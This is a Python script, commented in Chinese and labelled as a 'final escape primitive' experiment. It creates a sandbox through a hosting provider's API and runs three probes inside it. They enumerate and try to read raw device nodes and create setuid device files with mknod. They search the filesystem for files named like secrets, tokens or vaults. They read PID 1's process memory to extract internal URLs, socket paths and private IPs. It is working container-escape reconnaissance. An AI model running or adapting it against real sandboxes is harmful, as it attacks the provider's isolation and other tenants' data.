# 实验J247: 最后逃逸原语验证 - /dev/root设备 /dev/fuse /设备节点 /挂载点全览
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=280):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(4):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        if c == 410 or "sandbox_stopped" in r:
            print(f"  SANDBOX_DEAD at cmd[{label}]", flush=True)
            return "DEAD"
        time.sleep(3)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return "DEAD" if "sandbox_stopped" in r else ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

NAME = "expj247"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME})
print("create:", c, flush=True)
if c != 200:
    print(r[:400], flush=True)
    sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid, flush=True)

CODE_A = r'''
import subprocess, os
def p(*a):
    print(" ".join(str(x) for x in a), flush=True)
# 1) /dev 全览: 找设备节点
r = subprocess.run("ls -la /dev/ | head -40", shell=True, capture_output=True, text=True, timeout=10)
p("DEV", (r.stdout + r.stderr)[:1500].replace(chr(10), "|"))
# 2) /dev/root 是否存在
for d in ("/dev/root", "/dev/vdb", "/dev/vda", "/dev/sda", "/dev/fuse", "/dev/mem", "/dev/kmem", "/dev/kmsg", "/dev/sysrq-trigger", "/dev/port"):
    try:
        st = os.stat(d)
        p("STAT", d, st.st_mode & 0o170000, st.st_rdev if hasattr(st, "st_rdev") else "-")
    except Exception as e:
        p("STAT", d, "EXC", type(e).__name__)
# 3) 尝试读 /dev/root 前 512 字节 (若存在)
try:
    with open("/dev/root", "rb") as f:
        d = f.read(512)
        p("DEVROOT_READ", len(d), d[:16].hex())
except Exception as e:
    p("DEVROOT_READ", "EXC", type(e).__name__, str(e)[:80])
# 4) mknod 尝试 (userns 内建块设备 - 应失败, 但验证)
for rdev, name in ((0xB301, "xfs_test"), (0x800, "sd_test")):
    try:
        os.mknod("/tmp/" + name, 0o600 | 0o6000, rdev)
        p("MKNOD", name, "OK")
    except Exception as e:
        p("MKNOD", name, "EXC", type(e).__name__, str(e)[:60])
# 5) mountinfo 全览 (找可写/异常挂载)
r = subprocess.run("cat /proc/self/mountinfo | grep -vE '^(68|69|70|71|72|73|74|75|76|77)' | head -25", shell=True, capture_output=True, text=True, timeout=10)
p("MI", (r.stdout + r.stderr)[:2000].replace(chr(10), "|"))
p("DONE_A", flush=True)
'''
run_cmd(sid, CODE_A, "A_DEV", timeout=100)

CODE_B = r'''
import os, subprocess
def p(*a):
    print(" ".join(str(x) for x in a), flush=True)
# /volumes 宿主卷目录?
for path in ("/volumes", "/volumes/run", "/host", "/hostfs", "/mnt", "/mnt/host", "/opt", "/data"):
    try:
        r = subprocess.run("ls -la " + path + " 2>&1 | head -10", shell=True, capture_output=True, text=True, timeout=8)
        p("LS", path, "rc", r.returncode, (r.stdout + r.stderr)[:400].replace(chr(10), "|"))
    except Exception as e:
        p("LS", path, "EXC", repr(e))
# 根目录文件
r = subprocess.run("ls -la / | head -30", shell=True, capture_output=True, text=True, timeout=10)
p("ROOTLS", (r.stdout + r.stderr)[:1200].replace(chr(10), "|"))
# 找可疑文件
r = subprocess.run("find / -maxdepth 3 -name '*host*' -o -name '*vault*' -o -name '*secret*' -o -name '*token*' 2>/dev/null | grep -v proc | head -20", shell=True, capture_output=True, text=True, timeout=15)
p("FIND", (r.stdout + r.stderr)[:800].replace(chr(10), "|"))
p("DONE_B", flush=True)
'''
run_cmd(sid, CODE_B, "B_FS", timeout=100)

CODE_C = r'''
import ctypes, re
def p(*a):
    print(" ".join(str(x) for x in a), flush=True)
# 搜 PID1 全 text+data 段: URL/proxy/socket 路径 (不搜凭据, 搜基础设施线索)
class Iovec(ctypes.Structure):
    _fields_ = [("iov_base", ctypes.c_void_p), ("iov_len", ctypes.c_size_t)]
libc = ctypes.CDLL("libc.so.6", use_errno=True)
libc.process_vm_readv.argtypes = [ctypes.c_int, ctypes.POINTER(Iovec), ctypes.c_ulong, ctypes.POINTER(Iovec), ctypes.c_ulong, ctypes.c_ulong]
libc.process_vm_readv.restype = ctypes.c_ssize_t
# 从 maps 拿所有段
segs = []
for ln in open("/proc/1/maps"):
    parts = ln.split()
    if len(parts) < 2:
        continue
    lo, hi = (int(x, 16) for x in parts[0].split("-"))
    perm = parts[1]
    path = parts[5] if len(parts) > 5 else ""
    if "libc" in path or "ld-" in path or "[vsyscall]" in path or "[vvar]" in path or "[vdso]" in path:
        continue
    if hi - lo > 64 * 1024 * 1024:
        continue
    segs.append((lo, hi, perm, path))
p("SEGS", len(segs))
pat = re.compile(rb"(?:https?://[a-zA-Z0-9\.\-]{5,60}(?:/[a-zA-Z0-9_\-\./]{0,60})?|/run/[a-zA-Z0-9_\-\./]{3,80}|unix://[a-zA-Z0-9_\-\./]{3,80}|64\.64\.\d+\.\d+|100\.64\.\d+\.\d+|10\.\d+\.\d+\.\d+|172\.(?:1[6-9]|2\d|3[01])\.\d+\.\d+)")
hits = {}
for lo, hi, perm, path in segs:
    off = 0
    while off < hi - lo:
        n = min(0x10000, hi - lo - off)
        buf = ctypes.create_string_buffer(n)
        local = Iovec(ctypes.cast(buf, ctypes.c_void_p), n)
        remote = Iovec(lo + off, n)
        r = libc.process_vm_readv(1, ctypes.byref(local), 1, ctypes.byref(remote), 1, 0)
        if r <= 0:
            break
        for m in pat.finditer(buf.raw[:r]):
            s = m.group(0)
            if len(s) > 5 and len(set(s)) > 3:
                hits.setdefault(s, 0)
                hits[s] += 1
        off += n
p("HITS", len(hits))
for s, c in sorted(hits.items(), key=lambda x: -x[1])[:40]:
    p("  ", s[:120], c)
p("DONE_C", flush=True)
'''
run_cmd(sid, CODE_C, "C_MEMURL", timeout=280)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
